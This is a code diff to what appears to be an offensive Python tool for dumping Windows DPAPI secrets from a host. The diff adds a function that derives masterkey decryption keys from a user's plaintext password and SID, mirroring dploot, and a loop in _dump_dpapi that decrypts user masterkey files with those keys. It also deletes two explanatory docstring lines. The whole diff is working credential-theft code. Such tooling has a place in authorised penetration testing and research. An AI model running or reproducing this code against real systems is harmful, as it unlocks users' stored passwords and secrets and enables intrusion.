@@ -396,8 +396,6 @@ def _mk_decrypt_file(data: bytes, key: bytes) -> tuple:
 def _derive_user_keys(sid: str, nt_bytes: bytes) -> list:
     """Derive DPAPI masterkey decryption keys from NT hash + user SID.
 
-    Windows encrypts user masterkeys with an HMAC-SHA1-derived key, not
-    the raw NT hash.  Protected Users adds a PBKDF2-SHA256 derivation.
     Mirrors dploot's deriveKeysFromUserkey().
     """
     z_sid = (sid + '\0').encode('utf-16-le')
@@ -413,6 +411,28 @@ def _derive_user_keys(sid: str, nt_bytes: bytes) -> list:
         keys.insert(0, key2)
 
     return keys
+
+
+def _derive_password_keys(sid: str, password: str) -> list:
+    """Derive DPAPI masterkey decryption keys from plaintext password + SID.
+
+    Mirrors dploot's deriveKeysFromUser(). Adds the SHA1(password) path
+    that deriveKeysFromUserkey() cannot compute from just the NT hash.
+    """
+    pw_utf16 = password.encode('utf-16-le')
+    z_sid = (sid + '\0').encode('utf-16-le')
+    sid_bytes = sid.encode('utf-16-le')
+
+    pw_sha1 = hashlib.sha1(pw_utf16).digest()
+    pw_md4 = bytes.fromhex(_md4(pw_utf16))
+
+    key1 = hmac.new(pw_sha1, z_sid, 'sha1').digest()
+    key2 = hmac.new(pw_md4, z_sid, 'sha1').digest()
+    tmp = hashlib.pbkdf2_hmac('sha256', pw_md4, sid_bytes, 10000)
+    tmp2 = hashlib.pbkdf2_hmac('sha256', tmp, sid_bytes, 1)[:16]
+    key3 = hmac.new(tmp2, z_sid, 'sha1').digest()[:20]
+
+    return [key3, key1, key2]
 
 
 def _blob_parse(data: bytes) -> dict:
@@ -1803,6 +1823,28 @@ def _dump_dpapi(host: str, args, auth: list, dpapi_system_hex: str,
                         pass
             if decrypted:
                 out.append(f'[*] User MKs via NT hash: {decrypted}')
+
+        password = getattr(args, 'password', None) or ''
+        if password and files['user_mks']:
+            decrypted = 0
+            for username, mkfs in files['user_mks'].items():
+                sid = files['user_sids'].get(username, '')
+                if not sid:
+                    continue
+                keys = _derive_password_keys(sid, password)
+                for mkf_path in mkfs:
+                    try:
+                        data = open(mkf_path, 'rb').read()
+                        for key in keys:
+                            guid, mk = _mk_decrypt_file(data, key)
+                            if guid and mk and guid not in masterkeys:
+                                masterkeys[guid] = mk
+                                decrypted += 1
+                                break
+                    except Exception:
+                        pass
+            if decrypted:
+                out.append(f'[*] User MKs via password: {decrypted}')
 
         total_mk = len(masterkeys)
         out.append(f'[*] Total masterkeys available: {total_mk}')
